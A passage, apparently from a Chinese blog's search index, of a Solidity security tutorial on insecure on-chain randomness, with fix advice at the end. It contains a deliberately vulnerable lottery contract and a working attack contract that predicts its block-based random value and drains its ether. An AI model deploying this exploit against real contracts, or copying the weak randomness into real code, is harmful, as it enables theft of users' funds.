+<p>预言机是专门为生成随机数种子而搭建的链上或者链下的服务。除了使用第三方服务，也可以由 DApp 开发商自己搭建一个链下服务提供随机数，这种在链上获取链下数据的场景通常是通过链上预言机的方式来实现。</p>
+<p>当然这种方法也会有一些安全风险，例如依赖第三方给出的随机数种子的话同样会存在第三方作弊或者受贿的情形，即使是自己搭建的随机数服务也可能因为故障等原因无法使用，项目方也有可能操控随机数对 DApp 的运行和用户造成重大的损失。因此使用链下服务获取随机数的方法依赖于是否有一个可信又稳定的第三方服务，如果有，那么这个方法相较于使用区块链变量生成随机数的方法，随机数的不可预测性会更强一些。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>猜数字游戏，玩家通过调用合约 mint() 函数，函数会产生一个随机数，如果随机数为奇数，表示中奖，会给于 1 ether 作为奖励；如果随机数为偶数，表示没有中奖。以下是漏洞代码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Random &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() private view returns(bool) &#123;</span><br><span class="line">        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));</span><br><span class="line">        if(random%2 == 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public payable returns(bool randLucky) &#123;</span><br><span class="line">        randLucky = _getRandom();</span><br><span class="line">        if (randLucky == true) &#123;</span><br><span class="line">            require(payable(msg.sender).send(1 ether));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>以上代码实现使用了区块链变量来生成随机数的算法， 这里生成的随机数是可以被攻击预测到的，并可以清空受害合约的余额。<br>攻击合约使用死循环，不断判断受害合约的余额，直到取光所有的 ETH 。以下攻击代码：<br>如计算结果为偶数，需等待下一个区块；<br>如计算结果为奇数，保证获取奖励，并取走所有余额。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    receive() external payable &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function attack(address _random) external payable &#123;</span><br><span class="line">        for (;;) &#123;</span><br><span class="line">            if (_random.balance &lt; 1 ether) &#123;</span><br><span class="line">                emit Log(&quot;balance not enugh.&quot;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) &#123;</span><br><span class="line">                emit Log(&quot;failed to get rand number.&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            (bool ok, ) = _random.call(abi.encodeWithSignature(&quot;mint()&quot;));</span><br><span class="line">            if(!ok)&#123;</span><br><span class="line">                emit Log(&quot;failed to call mint().&quot;);</span><br><span class="line">                return ;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                emit Log(&quot;get reward success.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>外部随机数生成器：</strong> 利用外部随机数生成服务，例如Chainlink VRF（Verifiable Random Function），提供真实随机数并且具备可验证的特性。<br><strong>多源输入：</strong> 将多个来源的数据组合生成随机数，例如区块链属性、用户输入，以及合约状态的混合使用，提升不可预测性。<br><strong>时间延迟：</strong> 不马上使用生成的随机数，而是等几个区块之后再使用，以增加干扰概率，降低操控的可能性。<br><strong>密码学方法：</strong> 使用密码学安全的随机数生成算法，确保攻击者无法逆推出初始状态或预测生成结果。</p>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
       </tags>
   </entry>
 </search>
